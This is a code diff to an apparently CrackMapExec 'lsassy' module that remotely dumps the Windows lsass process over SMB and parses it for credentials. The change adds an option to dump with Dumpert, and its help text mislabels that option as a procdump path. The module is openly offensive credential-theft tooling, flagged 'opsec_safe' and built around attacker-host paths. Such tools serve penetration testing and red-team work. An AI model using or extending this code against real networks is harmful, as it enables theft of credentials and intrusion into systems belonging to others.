@@ -11,16 +11,17 @@ import sys
 
 class CMEModule:
     name = 'lsassy'
-    description = "Dump lsass via procdump and parse the result remotely with lsassy"
+    description = "Dump lsass and parse the result remotely with lsassy"
     supported_protocols = ['smb']
     opsec_safe = True
     multiple_hosts = True
 
     def options(self, context, module_options):
         """
-            METHOD              Method to use to dump procdump with lsassy. See lsassy -h for more details
+            METHOD              Method to use to dump lsass.exe with lsassy. See lsassy -h for more details
             REMOTE_LSASS_DUMP   Name of the remote lsass dump (default: Random)
             PROCDUMP_PATH       Path to procdump on attacker host (Required for method 2)
+            DUMPERT_PATH        Path to procdump on attacker host (Required for method 5)
             BLOODHOUND          Enable Bloodhound integration (default: false)
             NEO4JURI            URI for Neo4j database (default: 127.0.0.1)
             NEO4JPORT           Listeninfg port for Neo4j database (default: 7687)
@@ -32,6 +33,7 @@ class CMEModule:
         self.method = False
         self.remote_lsass_dump = False
         self.procdump_path = False
+        self.dumpert_path = False
 
         if 'METHOD' in module_options:
             self.method = module_options['METHOD']
@@ -41,6 +43,10 @@ class CMEModule:
 
         if 'PROCDUMP_PATH' in module_options:
             self.procdump_path = module_options['PROCDUMP_PATH']
+
+        if 'DUMPERT_PATH' in module_options:
+            self.dumpert_path = module_options['DUMPERT_PATH']
+            self.method = 5
 
         self.bloodhound = False
         self.neo4j_URI = "127.0.0.1"
@@ -103,6 +109,9 @@ class CMEModule:
 
         if self.procdump_path:
             command += " --procdump {}".format(self.procdump_path)
+
+        if self.dumpert_path:
+            command += " --dumpert {}".format(self.dumpert_path)
 
         # Parsing lsass dump remotely
         context.log.info('Parsing lsass with lsassy')
